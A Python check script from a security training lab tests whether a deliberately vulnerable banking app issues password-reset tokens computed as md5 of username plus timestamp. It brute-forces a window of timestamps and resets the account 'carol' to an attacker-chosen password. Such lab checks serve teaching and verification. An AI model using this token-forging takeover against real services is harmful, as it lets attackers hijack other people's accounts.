"""LAB 19 (A07 — Identification and Authentication Failures): predictable
password reset token.

Exploit: the reset token is md5(username + unixTimestamp). An attacker who
knows only the username and roughly when the request was made can recompute
the token offline and take over the account.

The check computes candidates for a window of timestamps around the request
and tries to redeem one. On the vulnerable build one of them is accepted; on
the fixed build none of them are.
"""

import hashlib
import time

from common import Client, Result, Verdict

ID = 19
TITLE = "Predictable reset token — compute it offline from the username"
ENDPOINT = "POST /api/auth/reset-request, POST /api/auth/reset-confirm"
AFFECTED = "backend/src/main/java/com/securebank/labs/a07/AuthController.java -> resetRequest(Map)"

ACCOUNT = "carol"
# The window the attacker would guess: the request time, +/- a minute.
WINDOW_SECONDS = 90


def run(ctx: Client) -> Result:
    before = int(time.time())

    r = ctx.post("/api/auth/reset-request", json={"username": ACCOUNT})
    if r.status_code != 200:
        return Result(
            Verdict.INCONCLUSIVE,
            f"the reset request returned HTTP {r.status_code}: {r.text[:200]}",
        )

    after = int(time.time())

    # Compute candidate tokens for every plausible timestamp.
    candidates = []
    for ts in range(before - WINDOW_SECONDS, after + WINDOW_SECONDS + 1):
        digest = hashlib.md5(f"{ACCOUNT}{ts}".encode()).hexdigest()
        candidates.append(digest)

    for token in candidates:
        r = ctx.post(
            "/api/auth/reset-confirm",
            json={"token": token, "new_password": "attacker-chosen-password"},
        )
        if r.status_code == 200:
            return Result(
                Verdict.VULNERABLE,
                f"a token computed offline from the username was accepted — "
                f"{ACCOUNT}'s password was reset without any email",
            )

    # The server did hand out a token in the response body (for lab
    # convenience). If that token also fails, the scheme is not predictable.
    return Result(
        Verdict.FIXED,
        f"none of the {len(candidates)} timestamp-derived tokens were accepted — "
        "the reset token is not predictable from the username",
    )
